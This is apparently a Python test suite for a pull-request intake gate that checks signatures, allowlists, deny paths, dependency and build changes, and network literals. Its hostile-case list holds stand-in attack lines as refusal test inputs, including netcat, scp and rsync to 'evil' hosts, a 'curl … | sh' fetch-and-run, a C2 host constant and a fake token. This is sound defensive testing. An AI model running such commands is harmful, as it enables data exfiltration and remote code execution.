#!/usr/bin/env python3
import contextlib
import copy
import dataclasses
import io
import json
import os
import pathlib
import shutil
import subprocess
import sys
import tempfile
import unittest.mock

import bridge

ROOT = bridge.ROOT
FIXTURES = ROOT / "scripts/intake/fixtures"
H = "16991ef417f2f1f5ab7ae4029ab3a4c373360907"
M = "7fd1a60b01f91b314f59955a4e4d4e80d8edf11d"
F = "53c7af144af22d8460e45f96d6337ecba4470d8f"
TEMPS = []


def valid_case() -> bridge.Case:
    recorded = json.loads((FIXTURES / "pull-request.json").read_text())
    raw = (FIXTURES / "pull-request.patch").read_bytes()
    patch = b"diff --git " + raw.split(b"diff --git ", 1)[1]
    contributor = copy.deepcopy(bridge.load_allowed()["contributors"]["jackmaxwil"])
    base = tempfile.TemporaryDirectory(prefix="intake-valid-base-")
    path = pathlib.Path(base.name)
    context = next(line[1:] for line in patch.decode().splitlines() if line.startswith(" Hello World!"))
    (path / "README").write_text(context + "\n")
    TEMPS.append(base)
    def apply_check(data: bytes, _base: str):
        out = subprocess.run(["git", "apply", "--check", "--whitespace=error", "-"], cwd=path, input=data, capture_output=True, check=False)
        if out.returncode:
            return out.stderr.decode("utf-8", "replace")
        return None

    case = bridge.Case(
        recorded["number"], "jackmaxwil", "open", bridge.GITHUB_REPO, "main", H, H, H, M, F, F,
        [bridge.Commit(H, "mazac@chapman.edu", "mazac@chapman.edu")], bridge.parse_diff(patch), patch, contributor,
    )
    case.title = recorded["title"]
    case.body = recorded["body"]
    case.apply_check = apply_check
    case._fixture_temp = base
    return case


IMPORT_AS = json.loads((FIXTURES / "import-as.json").read_text())
FINGERPRINT = IMPORT_AS["contributor"]["fingerprints"][0]


@contextlib.contextmanager
def second_contributor():
    """The fixture's second contributor is registered in memory; allowed.json carries the owner's real entries only."""
    allowed = copy.deepcopy(bridge.load_allowed())
    allowed["contributors"][IMPORT_AS["login"]] = copy.deepcopy(IMPORT_AS["contributor"])
    with unittest.mock.patch.object(bridge, "load_allowed", lambda: allowed):
        yield allowed


def mapped_case() -> bridge.Case:
    case = valid_case()
    row = IMPORT_AS["contributor"]
    case.login = IMPORT_AS["login"]
    case.user_id = row["user_id"]
    case.contributor = copy.deepcopy(row)
    case.commits = [bridge.Commit(H, row["emails"][0], row["emails"][0])]
    case.signer = row["fingerprints"][0]
    return case


def unmapped_case() -> bridge.Case:
    case = mapped_case()
    case.login = "jackmaxwil"
    case.user_id = None
    case.contributor = copy.deepcopy(bridge.load_allowed()["contributors"]["jackmaxwil"])
    case.commits = [bridge.Commit(H, "mazac@chapman.edu", "mazac@chapman.edu")]
    case.signer = None
    return case


def with_change(case: bridge.Case, **changes) -> bridge.Case:
    cloned = copy.deepcopy(case)
    for key, value in changes.items():
        setattr(cloned.changes[0], key, value)
    return cloned


def added(case: bridge.Case, text: str, path: str = "README") -> bridge.Case:
    cloned = copy.deepcopy(case)
    cloned.changes = [bridge.Change(path, added=[bridge.AddedLine(path, 2, text)])]
    return cloned


def many_commits(case: bridge.Case, count: int) -> list[bridge.Commit]:
    return [bridge.Commit(f"{index:040x}", "mazac@chapman.edu", "mazac@chapman.edu") for index in range(1, count + 1)]


def hostile_cases() -> list[tuple[str, str, bridge.Case, str]]:
    base = valid_case()
    cap = base.contributor["caps"]
    cases = []

    def add(name: str, check: str, case: bridge.Case, code: str) -> None:
        cases.append((name, check, case, code))

    add("stranger", "allowlist", dataclasses.replace(base, login="stranger"), "allowlist")
    add("base-shape", "allowlist", dataclasses.replace(base, base_repo="octocat/Hello-World", base_ref="master"), "base")
    add("unsigned", "signature", dataclasses.replace(base, commits=[dataclasses.replace(base.commits[0], signature=False)]), "signature")
    add("wrong-author", "identity", dataclasses.replace(base, commits=[dataclasses.replace(base.commits[0], author="other@example.invalid")]), "identity")
    add("wrong-committer", "identity", dataclasses.replace(base, commits=[dataclasses.replace(base.commits[0], committer="other@example.invalid")]), "identity")
    add("fetch-pin", "head", dataclasses.replace(base, fetched_head="0" * 40), "head")
    add("moved-head", "head", dataclasses.replace(base, current_head="0" * 40), "head")
    add("commits-cap-plus-one", "commits", dataclasses.replace(base, commits=many_commits(base, cap["commits"] + 1)), "commits")
    changes = [bridge.Change(f"docs/file-{index}.md") for index in range(cap["files"] + 1)]
    add("files-cap-plus-one", "files", dataclasses.replace(base, changes=changes), "files")
    long_lines = [bridge.AddedLine("README", index + 2, "safe") for index in range(cap["lines"] + 1)]
    add("lines-cap-plus-one", "lines", dataclasses.replace(base, changes=[bridge.Change("README", added=long_lines)]), "lines")
    add("bytes-cap-plus-one", "bytes", dataclasses.replace(base, patch=b"x" * (cap["bytes"] + 1)), "bytes")
    add("unmappable-base", "base-history", dataclasses.replace(base, mapped_bases=()), "base")
    add("merge-commit", "base-history", dataclasses.replace(base, commits=[dataclasses.replace(base.commits[0], parents=2)]), "history")
    add("deny-path", "path", with_change(base, path="scripts/intake/allowed.json", old_path="scripts/intake/allowed.json"), "path")
    add("build-rs-path", "path", with_change(base, path="crates/probe/build.rs", old_path="/dev/null", old_mode=None), "path")
    add("cargo-config-case", "path", with_change(base, path=".Cargo/config.toml", old_path="/dev/null", old_mode=None), "path")
    add("build-rs-case", "path", with_change(base, path="crates/probe/BUILD.RS", old_path="/dev/null", old_mode=None), "path")
    add("exclude-case", "path", with_change(base, path="docs/Forge.md", old_path="/dev/null", old_mode=None), "path")
    add("wall-case", "path", with_change(base, path="Scripts/Intake/allowed.json", old_path="/dev/null", old_mode=None), "path")
    add("cargo-config", "path", with_change(base, path=".cargo/config.toml", old_path="/dev/null", old_mode=None), "path")
    add("nested-cargo-config", "path", with_change(base, path="crates/probe/.cargo/config", old_path="/dev/null", old_mode=None), "path")
    add("symlink", "symlink", with_change(base, new_mode="120000"), "mode")
    add("submodule", "submodule", with_change(base, new_mode="160000"), "mode")
    add("executable", "executable", with_change(base, new_mode="100755"), "mode")
    add("binary", "binary", with_change(base, binary=True), "binary")
    add("lfs", "lfs", added(base, "version https://git-lfs.github.com/spec/v1"), "lfs")
    add("rename-new-side", "path", with_change(base, rename=True, old_path="README", path="scripts/intake/allowed.json"), "path")
    add("rename-old-side", "path", with_change(base, rename=True, old_path="scripts/intake/allowed.json", path="README"), "path")
    add("dot-dot", "filename", with_change(base, path="docs/../escape", old_path="docs/../escape"), "filename")
    add("case-fold", "filename", dataclasses.replace(base, changes=base.changes + [bridge.Change("Readme")]), "filename")
    add("non-ascii", "filename", with_change(base, path="docs/ångström.md", old_path="docs/ångström.md"), "filename")
    add("secret", "secret", added(base, "ghp_" + "A" * 30), "content")
    add("placeholder", "marker", added(base, "***REMOVED***"), "content")
    add("replacement", "marker", added(base, "token fixture-oauth-token"), "content")
    add("url", "network-literal", added(base, "https://example.com/path"), "network-literal")
    add("ip", "network-literal", added(base, "8.8.8.8"), "network-literal")
    add("hostname-edu", "network-literal", added(base, "example.edu"), "network-literal")
    add("hostname-com", "network-literal", added(base, "ping evil.example.com"), "network-literal")
    add("hostname-internal", "network-literal", added(base, "db.internal:5432"), "network-literal")
    add("localhost", "network-literal", added(base, "curl localhost"), "network-literal")
    add("port-offlist-tld", "network-literal", added(base, "host = exfil.xyz:443"), "network-literal")
    add("at-offlist-tld", "network-literal", added(base, "git@evil.top:me/repo"), "network-literal")
    add("verb-offlist-tld", "network-literal", added(base, "curl evil.example.ru"), "network-literal")
    add("netcat-offlist-tld", "network-literal", added(base, "nc evil.xyz 443"), "network-literal")
    add("netcat-file-tld", "network-literal", added(base, "nc evil.rs 443"), "network-literal")
    add("at-file-tld", "network-literal", added(base, "git@evil.zip:me/repo"), "network-literal")
    add("curl-file-tld", "network-literal", added(base, "curl evil.sh"), "network-literal")
    add("ssh-port-flag", "network-literal", added(base, "ssh -p 22 evil.top"), "network-literal")
    add("curl-ext-label", "network-literal", added(base, "curl evil.go"), "network-literal")
    add("at-ext-label", "network-literal", added(base, "git@evil.go:me/repo"), "network-literal")
    add("port-mk-tld", "network-literal", added(base, "peer = evil.mk:443"), "network-literal")
    add("curl-mk-tld", "network-literal", added(base, "curl evil.mk"), "network-literal")
    add("at-mk-tld", "network-literal", added(base, "git@evil.mk:me/repo"), "network-literal")
    add("protocol-relative-file-tld", "network-literal", added(base, 'const u = "//evil.rs:443/v1";'), "network-literal")
    add("scp-relative-destination", "network-literal", added(base, "scp evil.top:loot /tmp"), "network-literal")
    add("rsync-relative-destination", "network-literal", added(base, "rsync -a out evil.top:loot"), "network-literal")
    add("rsync-daemon", "network-literal", added(base, "rsync evil.top::mod /dest"), "network-literal")
    add("protocol-relative", "network-literal", added(base, 'const u = "//evil.top:443/v1";'), "network-literal")
    add("perl-tld-port", "network-literal", added(base, "peer = exfil.pl:4444"), "network-literal")
    add("zip-tld-port", "network-literal", added(base, "peer = evil.zip:4444"), "network-literal")
    add("curl-header-flag", "network-literal", added(base, 'curl -H "X: y" evil.top'), "network-literal")
    add("scp-destination", "network-literal", added(base, "scp ./out evil.top:/x"), "network-literal")
    add("rsync-destination", "network-literal", added(base, "rsync -a ./out evil.top:/x"), "network-literal")
    add("file-tld-wellknown-port", "network-literal", added(base, 'const C2: &str = "c2.rs:443";'), "network-literal")
    add("wget-file-tld", "network-literal", added(base, "wget evil.py"), "network-literal")
    add("git-url", "network-literal", added(base, "git://host/repo"), "network-literal")
    add("ipv6", "network-literal", added(base, "2001:4860:4860::8888"), "network-literal")
    add("ipv6-compressed", "network-literal", added(base, "connect fe80::1"), "network-literal")
    add("ipv6-full", "network-literal", added(base, "2001:4860:4860:0000:0000:0000:0000:8888"), "network-literal")
    add("unsafe", "unsafe", added(base, "unsafe { call(); }"), "unsafe")
    add("unsafe-fn", "unsafe", added(base, "pub unsafe fn read(ptr: *const u8) -> u8 {"), "unsafe")
    add("unsafe-brace-next-line", "unsafe", added(base, "    unsafe"), "unsafe")
    add("unsafe-attribute", "unsafe", added(base, '#[unsafe(link_section = ".init_array")]'), "unsafe")
    add("unsafe-wrapped-attr", "unsafe", added(base, '    unsafe(link_section = ".init_array")'), "unsafe")
    add("unsafe-cfg-attr", "unsafe", added(base, '#[cfg_attr(feature = "x", unsafe(no_mangle))]'), "unsafe")
    add("unsafe-cfg-attr-wrapped", "unsafe", added(base, '    allow(unused), unsafe(export_name = "main"))]'), "unsafe")
    add("proc-macro", "build", added(base, "proc-macro = true", "crates/probe/Cargo.toml"), "build")
    add("proc-macro-underscore", "build", added(base, "proc_macro = true", "crates/probe/Cargo.toml"), "build")
    add("build-script-key", "build", added(base, 'build = "src/gen.rs"', "crates/probe/Cargo.toml"), "build")
    add("build-dependencies-section", "build", added(base, "[build-dependencies]", "crates/probe/Cargo.toml"), "build")
    add("vendor-manifest", "path", with_change(base, path="vendor/syntect/Cargo.toml", old_path="/dev/null", old_mode=None), "path")
    add("dependency-section", "build", added(base, "[dependencies]", "Cargo.toml"), "build")
    add("dependency", "dependencies", added(base, "serde = \"1\"", "Cargo.toml"), "dependencies")
    add("dependency-case", "dependencies", added(base, "serde = \"1\"", "crates/probe/cargo.toml"), "dependencies")
    add("lockfile-case", "dependencies", dataclasses.replace(base, changes=[bridge.Change("CARGO.LOCK")]), "dependencies")
    without_consent = copy.deepcopy(IMPORT_AS["contributor"])
    del without_consent["import_as"]["consent"]
    add("import-as-no-consent", "import-as", dataclasses.replace(mapped_case(), contributor=without_consent), "import-as")
    addressed = copy.deepcopy(IMPORT_AS["contributor"])
    addressed["import_as"]["email"] = "Maximillian Ludwick <max@example.invalid>"
    add("import-as-addressed-email", "import-as", dataclasses.replace(mapped_case(), contributor=addressed), "import-as")

    def failed_apply(_patch: bytes, _base: str):
        return "error: patch failed: README:1"

    add("replaced-context", "apply", dataclasses.replace(base, apply_check=failed_apply), "apply")
    add("invalid-lens", "lens", dataclasses.replace(base, lens=lambda _prompt: {"refusals": "wrong"}), "lens unavailable")
    refusal = {"refusals": [{"path": "README", "line": 2, "reason": "model-added refusal"}]}
    add("lens-refusal", "lens", dataclasses.replace(base, lens=lambda _prompt: refusal), "lens")
    return cases


def check_caps() -> None:
    base = valid_case()
    cap = base.contributor["caps"]
    at_cap = [
        dataclasses.replace(base, commits=many_commits(base, cap["commits"])),
        dataclasses.replace(base, changes=[bridge.Change(f"docs/file-{index}.md") for index in range(cap["files"])]),
        dataclasses.replace(base, changes=[bridge.Change("README", added=[bridge.AddedLine("README", index + 2, "safe") for index in range(cap["lines"])])]),
        dataclasses.replace(base, patch=b"x" * cap["bytes"], apply_check=lambda _patch, _base: None),
    ]
    for case in at_cap:
        assert bridge.evaluate(case) == bridge.ALLOW

def git_in(repo: pathlib.Path, *args: str) -> bytes:
    return bridge.git(["-C", str(repo), *args]).stdout


def stage(repo: pathlib.Path, files: dict[str, bytes]) -> None:
    for name, data in files.items():
        (repo / name).parent.mkdir(parents=True, exist_ok=True)
        (repo / name).write_bytes(data)
    git_in(repo, "add", "-A")


def fixture_repo(repo: pathlib.Path, files: dict[str, bytes]) -> pathlib.Path:
    repo.mkdir(parents=True, exist_ok=True)
    git_in(repo, "init", "-q", "-b", "main")
    stage(repo, files)
    git_in(repo, "-c", "core.hooksPath=/dev/null", "-c", "user.name=Fixture", "-c", "user.email=fixture@example.invalid", "commit", "--allow-empty", "-qm", "Base")
    return repo


def staged_patch(repo: pathlib.Path) -> bytes:
    return git_in(repo, "diff", "--cached", "--no-renames", "--binary", "--full-index")


def keygen_trouble() -> str:
    """Why ssh-keygen cannot make or verify a key on this host, or "" when it can."""
    with tempfile.TemporaryDirectory(prefix="intake-keygen-") as temp:
        made = subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-f", str(pathlib.Path(temp) / "probe")], capture_output=True, text=True)
    return "" if made.returncode == 0 else (made.stderr.strip() or "ssh-keygen is not installed")


def filter_repo_missing() -> str:
    """The install line for a selfcheck that needs git filter-repo this host does not have, or ""."""
    if shutil.which("git-filter-repo"):
        return ""
    pin = (ROOT / "scripts/mirror/filter-repo.version").read_text().strip()
    return f"skip intake rewrite (git-filter-repo is not installed here: uv tool install git-filter-repo=={pin})"


def check_rewrite_helper() -> None:
    with tempfile.TemporaryDirectory(prefix="intake-rewrite-") as temp:
        source = fixture_repo(pathlib.Path(temp) / "source", {"README": b"safe fixture\n"})
        rewritten = pathlib.Path(temp) / "rewritten.git"
        original = git_in(source, "rev-parse", "HEAD").decode().strip()
        out = subprocess.run(["bash", str(ROOT / "scripts/mirror/rewrite.sh"), str(source), str(rewritten)], capture_output=True, text=True, check=True)
        assert out.stdout.strip() == original, out.stdout
        mirror = git_in(rewritten, "rev-parse", "main").decode().strip()
        mapping = bridge.parse_commit_map(rewritten / "filter-repo/commit-map")
        assert mapping[original] == mirror
        assert {new: old for old, new in mapping.items()}[mirror] == original


def check_real_patch_edges() -> None:
    with tempfile.TemporaryDirectory(prefix="intake-mode-patch-") as temp:
        repo = fixture_repo(pathlib.Path(temp), {"script.sh": b"exit 0\n"})
        (repo / "script.sh").chmod(0o755)
        stage(repo, {})
        patch = staged_patch(repo)
        case = dataclasses.replace(valid_case(), changes=bridge.parse_diff(patch), patch=patch)
        assert bridge.check_13_executables(case).text == "intake: mode: 'script.sh' changes the executable bit"
    with tempfile.TemporaryDirectory(prefix="intake-binary-patch-") as temp:
        repo = fixture_repo(pathlib.Path(temp), {})
        stage(repo, {"blob.dat": b"\x00\x01\x02"})
        patch = staged_patch(repo)
        case = dataclasses.replace(valid_case(), changes=bridge.parse_diff(patch), patch=patch)
        assert bridge.check_14_binary(case).text == "intake: binary: 'blob.dat' is binary"




def check_deleted_dependency() -> None:
    with tempfile.TemporaryDirectory(prefix="intake-deleted-dependency-") as temp:
        repo = fixture_repo(pathlib.Path(temp), {"Cargo.lock": b"version = 3\n"})
        (repo / "Cargo.lock").unlink()
        stage(repo, {})
        patch = staged_patch(repo)
        case = dataclasses.replace(valid_case(), changes=bridge.parse_diff(patch), patch=patch)
        assert [change.path for change in case.changes] == ["/dev/null"]
        assert bridge.check_22_dependencies(case).text == "intake: dependencies: 'Cargo.lock' changes dependencies without per-login permission"

def real_diff(before: dict[str, str], after: dict[str, str]) -> bytes:
    with tempfile.TemporaryDirectory(prefix="intake-forged-") as temp:
        repo = fixture_repo(pathlib.Path(temp), {name: text.encode() for name, text in before.items()})
        stage(repo, {name: text.encode() for name, text in after.items()})
        return staged_patch(repo)


def check_forged_headers() -> None:
    workflow = ".forgejo/workflows/x.yml"
    spaced = ".forgejo/workflows/ b/ok.yml"
    lines = "".join(f"{number}\n" for number in range(30))
    forged = {
        "deleted line reads as a --- header": ({workflow: "a\n-- docs/x\nb\n"}, {workflow: "a\nb\n"}, [(workflow, [], 1)]),
        "added line reads as a +++ header": ({workflow: "a\nb\n"}, {workflow: "a\n++ docs/ok.md\nb\n"}, [(workflow, ["++ docs/ok.md"], 0)]),
        "both header lines forged, the bypass": ({workflow: "a\n-- docs/x\nb\n"}, {workflow: "a\nb\n++ docs/ok.md\n"}, [(workflow, ["++ docs/ok.md"], 1)]),
        "form feed splits an added line": ({workflow: "a\n"}, {workflow: "a\x0c+++ b/docs/ok.md\n"}, [(workflow, ["a\x0c+++ b/docs/ok.md"], 1)]),
        "two hunks, the second ending without a newline": ({workflow: lines}, {workflow: lines.replace("\n1\n", "\nx\n").replace("\n28\n", "\n-- y\n").rstrip("\n")}, [(workflow, ["x", "-- y", "29"], 3)]),
        "empty file under a ' b' directory": ({}, {spaced: ""}, [(spaced, [], 0)]),
    }
    for name, (before, after, expected) in forged.items():
        patch = real_diff(before, after)
        changes = bridge.parse_diff(patch)
        assert [(c.path, [line.text for line in c.added], c.deleted) for c in changes] == expected, f"{name}: {changes}"
        refused = bridge.check_10_deny_paths(dataclasses.replace(valid_case(), changes=changes, patch=patch))
        assert isinstance(refused, bridge.Refusal) and refused.text.endswith("is denied by .forgejo/"), f"{name}: {refused}"


def check_real_fixture() -> None:
    pr = json.loads((FIXTURES / "pull-request.json").read_text())
    commits = json.loads((FIXTURES / "commits.json").read_text())
    assert pr["head"]["sha"] == H and pr["base"]["sha"] == M
    assert commits and all("verification" in row["commit"] for row in commits)
    history = json.loads((FIXTURES / "mirror-history.json").read_text())
    mapping = bridge.parse_commit_map(FIXTURES / "commit-map.txt")
    for row in history["commits"]:
        assert mapping[row["forge"]] == row["mirror"]
    comparisons = json.loads((FIXTURES / "mirror-files.json").read_text())["comparisons"]
    assert comparisons
    for row in comparisons:
        assert row["mode_equal"], row["path"]
        assert row["expected_sha256"] == row["mirror_sha256"], row["path"]
        assert row["bytes_equal"] or row["replacement_applied"], row["path"]
    assert any(row["bytes_equal"] for row in comparisons)
    assert any(row["replacement_applied"] for row in comparisons)


def check_signed_object() -> None:
    raw = (FIXTURES / "signed-commit-object.txt").read_bytes()
    public = (FIXTURES / "signed-commit-key.pub").read_text().strip()
    with tempfile.TemporaryDirectory(prefix="intake-signed-object-") as temp:
        repo = pathlib.Path(temp)
        subprocess.run(["git", "init", "-q", str(repo)], check=True)
        empty = subprocess.run(["git", "-C", str(repo), "mktree"], input=b"", capture_output=True, check=True).stdout
        sha = subprocess.run(["git", "-C", str(repo), "hash-object", "-t", "commit", "-w", "--stdin"], input=raw, capture_output=True, check=True).stdout.decode().strip()
        assert empty.decode().strip() == raw.split(b"\n", 1)[0].split()[1].decode()
        contributor = {"emails": ["intake-fixture@example.invalid"], "fingerprints": [], "caps": {"commits": 20, "files": 40, "lines": 4000, "bytes": 150000}, "dependencies": False}
        registry = "intake-fixture@example.invalid " + public + "\n"
        signers = repo / "allowed_signers"
        signers.write_text("\n".join(bridge.signer_lines(contributor, registry)) + "\n")
        fingerprint = subprocess.check_output(["ssh-keygen", "-lf", FIXTURES / "signed-commit-key.pub"], text=True).split()[1]
        contributor["fingerprints"] = [fingerprint]
        allowed = repo / "allowed.json"
        allowed.write_text(json.dumps({"contributors": {"fixture": contributor}}))
        bridge.validate_registry(allowed, signers)
        assert bridge.commit_verified(repo, signers, sha)
        other = repo / "other_signers"
        other.write_text("\n".join(bridge.signer_lines(contributor, "other@example.invalid " + public + "\n")) + "\n")
        assert not bridge.commit_verified(repo, other, sha), "a key pinned to another login verified this login's commit"
        generated = repo / "throwaway"
        subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-f", str(generated)], check=True)
        wrong = repo / "wrong_signers"
        wrong.write_text("intake-fixture@example.invalid " + (generated.with_suffix(".pub")).read_text())
        assert not bridge.commit_verified(repo, wrong, sha)
        assert bridge.signer_fingerprint(repo, signers, sha) == fingerprint
        assert bridge.signer_fingerprint(repo, wrong, sha) is None

        def drifts(fingerprints: list[str], registry_text: str) -> bool:
            allowed.write_text(json.dumps({"contributors": {"fixture": {**contributor, "fingerprints": fingerprints}}}))
            signers.write_text(registry_text)
            try:
                bridge.validate_registry(allowed, signers)
            except ValueError:
                return True
            return False

        assert not drifts([fingerprint], registry)
        assert drifts(["SHA256:" + "A" * 43], registry), "a fingerprint that is not the key's was accepted"
        assert drifts([fingerprint], ""), "a pinned fingerprint with no key was accepted"
        assert drifts([fingerprint], registry + "stranger@example.invalid " + public + "\n"), "a key for an unpinned principal was accepted"


def import_commit(case: bridge.Case) -> tuple[pathlib.Path, str]:
    repo = fixture_repo(pathlib.Path(tempfile.mkdtemp(prefix="intake-import-")), {"README": b"Hello World!\n"})
    with unittest.mock.patch.dict(os.environ, {"GIT_AUTHOR_DATE": "2026-10-28T00:00:00Z", "GIT_COMMITTER_DATE": "2026-10-28T00:00:00Z"}):
        return repo, bridge.commit_import(repo, case)


def identity_of(repo: pathlib.Path, sha: str, field: str) -> str:
    return bridge.git_text(["-C", str(repo), "show", "-s", f"--format={field}", sha])


def check_mapped_import() -> None:
    mapped = mapped_case()
    with second_contributor():
        assert bridge.evaluate(mapped) == bridge.ALLOW
    repo, sha = import_commit(mapped)
    assert identity_of(repo, sha, "%an <%ae>") == "Maximillian Ludwick <30126044+Madmaxme@users.noreply.github.com>"
    assert identity_of(repo, sha, "%cn <%ce>") == "yi-bot <yi-bot@localhost>"
    plain = unmapped_case()
    other, plain_sha = import_commit(plain)
    assert identity_of(other, plain_sha, "%an <%ae>") == "jackmaxwil <mazac@chapman.edu>"
    assert identity_of(repo, sha, "%at") == identity_of(other, plain_sha, "%at") == "1793145600", "the mapping moved the author date"
    assert identity_of(repo, sha, "%T") == identity_of(other, plain_sha, "%T"), "the mapping moved the tree"
    assert identity_of(repo, sha, "%B") == identity_of(other, plain_sha, "%B"), "the mapping moved the message body"
    objects = "".join(bridge.git(["-C", str(repo), "cat-file", "-p", row]).stdout.decode() for row in bridge.git_text(["-C", str(repo), "rev-list", "--all"]).split())
    assert mapped.login not in objects and mapped.contributor["emails"][0] not in objects, "an imported commit object carries the source account"
    audit = bridge.audit_payload(mapped, sha, bridge.run_checks(mapped), "jack", None)
    shown = json.dumps(audit)
    assert mapped.login in shown and mapped.contributor["emails"][0] in shown, "the record lost the source account"
    assert audit["github_url"] == f"https://github.com/{bridge.GITHUB_REPO}/pull/{mapped.number}"
    assert audit["signer"] == FINGERPRINT


def check_import_as_refusals() -> None:
    base = mapped_case()
    with second_contributor():
        for field in ("consent", "name"):
            broken = copy.deepcopy(base.contributor)
            del broken["import_as"][field]
            assert bridge.evaluate(dataclasses.replace(base, contributor=broken)).text == f"intake: import-as: contributor '{base.login}' has import_as without {field}"
        addressed = copy.deepcopy(base.contributor)
        addressed["import_as"]["email"] = "Maximillian Ludwick <max@example.invalid>"
        assert bridge.evaluate(dataclasses.replace(base, contributor=addressed)).text == f"intake: import-as: contributor '{base.login}' import_as email 'Maximillian Ludwick <max@example.invalid>' is not a plain address"
        named = copy.deepcopy(base.contributor)
        named["import_as"]["name"] = "Maximillian <max@example.invalid>"
        assert bridge.evaluate(dataclasses.replace(base, contributor=named)).text == f"intake: import-as: contributor '{base.login}' import_as name 'Maximillian <max@example.invalid>' carries an address"


def check_signoff_rewrite() -> None:
    case = mapped_case()
    original, mapping = case.contributor["emails"][0], case.contributor["import_as"]
    source = f"Add the README section\n\nSigned-off-by: Pranav Chavan <{original}>\nCo-authored-by: Pranav <{original}>\n"
    assert bridge.remap_signoff(source, original, mapping) == "Add the README section\n\nSigned-off-by: Maximillian Ludwick <30126044+Madmaxme@users.noreply.github.com>\nCo-authored-by: Pranav <pranavchavan2024.it@mmcoe.edu.in>\n"
    assert bridge.imported_message(case) == bridge.imported_message(unmapped_case())
    assert bridge.mapping_line(case) == "Maximillian Ludwick <30126044+Madmaxme@users.noreply.github.com>, consent: Max, iMessage, 2026-10-29"
    assert bridge.mapping_line(unmapped_case()) == "jackmaxwil <mazac@chapman.edu>"


def check_dry_run_prints_mapping() -> None:
    case = mapped_case()

    class Fake:
        def load_case(self, number: int) -> bridge.Case:
            assert number == case.number
            return case

        def github(self, method: str, path: str, payload=None):
            return []

        def close(self) -> None:
            return None

    out = io.StringIO()
    with second_contributor(), unittest.mock.patch.object(bridge, "RealTransport", Fake), unittest.mock.patch.object(sys, "stdout", out):
        assert bridge.cli(["--dry-run", str(case.number)]) == 0
    assert out.getvalue() == f"PR #{case.number} ALLOW\nPR #{case.number} author Maximillian Ludwick <30126044+Madmaxme@users.noreply.github.com>, consent: Max, iMessage, 2026-10-29\n", out.getvalue()


def check_ordinary_text_is_allowed() -> None:
    base = valid_case()
    for text in ("let n = x.len();", "self.changes.push(line.path)", "see Cargo.toml and README.md", "mod args.rs;", "// the raw call is unsafe because it aliases", "#![forbid(unsafe_code)]", "self.app.run();", "self.io.flush()", "the infra repository", "cd ~/.yi", 'open("Cargo.toml")', "let id = row.id;", "server: host.ru", "@functools.cache", 'trace::span("console.draw")', '"response.failed"', "set `mcp.enabled` and `config.intake.enabled`", "see bridge.py:884 and args.rs:300", "`prompts-list`, `ping`. It speaks JSON-RPC itself, `mcp.enabled` gates", "see curl docs at src/app.rs", "// ping the runner; see scripts/hooks/commit.py", "let nc = self.pool.len();",
                 "wire.go:58 and grep_files.zig:344 and pipe_test.go:17-68", "src/main.rs:80", "scp report.txt host:/tmp",
                 "/// Copying is unsafe (the pointer may dangle)", "0 non-comment unsafe (the single",
                 # Documented ceiling: a ported host on a file-extension TLD counts only on a well-known port.
                 "host = exfil.sh:4444", "    @pytest.mark.parametrize(\"n\", [1])",
                 "at 12:30:45 UTC", 'let mac = "aa:bb:cc";', "let t = 10:20:30;", "// retries at 09:15:00 and 09:15:30"):
        assert bridge.evaluate(added(base, text)) == bridge.ALLOW, text


def check_lens_runs_without_tools_and_repairs_prose() -> None:
    calls = []
    answers = ["I found nothing wrong.", '{"refusals": []}']

    class FakePopen:
        returncode = 0

        def __init__(self, command, **kwargs):
            calls.append((command, kwargs["env"]))

        def __enter__(self):
            return self

        def __exit__(self, *exc):
            return False

        def communicate(self, text=None, timeout=None):
            return answers[len(calls) - 1], ""

    with unittest.mock.patch.dict(os.environ, {"YI_BIN": "yi-stub", "FGJ_TOKEN": "forge-token"}), unittest.mock.patch("subprocess.Popen", FakePopen):
        assert bridge.default_lens("diff") == {"refusals": []}
    assert len(calls) == 2 and "--continue" in calls[1][0]
    assert all("--no-tools" in command and "FGJ_TOKEN" not in env for command, env in calls)


def check_dry_run_write_detection() -> None:
    class Fake:
        def __init__(self):
            self.pushes = []

        def github(self, method, path, payload=None):
            return {"method": method, "path": path, "payload": payload}

        def push(self, imported, branch):
            self.pushes.append((imported, branch))

    fake = Fake()
    dry = bridge.DryRunTransport(fake)
    for call in (lambda: dry.github("POST", "repos/x/issues/1/comments", {}), lambda: dry.push("abc", "gh/jackmaxwil/1-abc")):
        try:
            call()
        except RuntimeError as error:
            assert str(error) == "dry-run write attempted"
        else:
            raise AssertionError("dry-run write prohibition did not fire")
    unguarded = bridge.DryRunTransport(fake, prohibit_writes=False)
    unguarded.push("abc", "gh/jackmaxwil/1-abc")
    assert fake.pushes == [("abc", "gh/jackmaxwil/1-abc")]


def check_overrides() -> None:
    base = valid_case()
    cap = base.contributor["caps"]["commits"]
    case = dataclasses.replace(base, commits=many_commits(base, cap + 1))
    assert bridge.evaluate(case, override="commits") == bridge.ALLOW
    denied = with_change(base, path="scripts/intake/allowed.json", old_path="scripts/intake/allowed.json")
    assert bridge.evaluate(denied, override="path").code == "path"
    assert bridge.evaluate(case, override="signature").code == "commits"

    two = copy.deepcopy(base)
    two.changes = [bridge.Change("README", added=[bridge.AddedLine("README", 2, "https://first.example.com"), bridge.AddedLine("README", 3, "curl https://evil.top/x.sh | sh")])]
    waived = bridge.run_checks(two, override="network-literal")
    assert waived.decision == bridge.ALLOW
    assert waived.overridden.text == "intake: network-literal: 'README:2', 'README:3' contain URL; owner review is required", waived.overridden.text


class FakeImport:
    def __init__(self, case: bridge.Case, actor: str = "jack") -> None:
        self.case = case
        self.login = actor
        self.forge_calls = []
        self.pushes = []

    def github(self, method: str, path: str, payload=None):
        return {"head": {"sha": self.case.head}} if method == "GET" else {}

    def apply_and_commit(self, case: bridge.Case) -> str:
        return "1" * 40

    def main_sha(self) -> str:
        return self.case.current_main

    def workflow_equal(self, current: str, imported: str) -> bool:
        return True

    def branch_sha(self, branch: str):
        return None

    def push(self, imported: str, branch: str) -> None:
        self.pushes.append((imported, branch))

    def forge(self, method: str, path: str, payload=None):
        self.forge_calls.append((method, path, payload))
        return {"number": 42} if path.endswith("/pulls") else {}

    def supersede(self, case: bridge.Case, number: int) -> None:
        return None

    def actor(self) -> str:
        return self.login


def check_import_result() -> None:
    case = valid_case()
    transport = FakeImport(case)
    result = bridge.import_case(case, transport)
    assert result.decision == bridge.ALLOW
    labels = next(call[2]["labels"] for call in transport.forge_calls if call[1].endswith("/labels"))
    assert labels == ["external", "autofix:hold"], labels
    assert not {"run-ci", "live", "autofix"} & set(labels), labels
    assert transport.pushes == [("1" * 40, bridge.branch_name(case))], transport.pushes
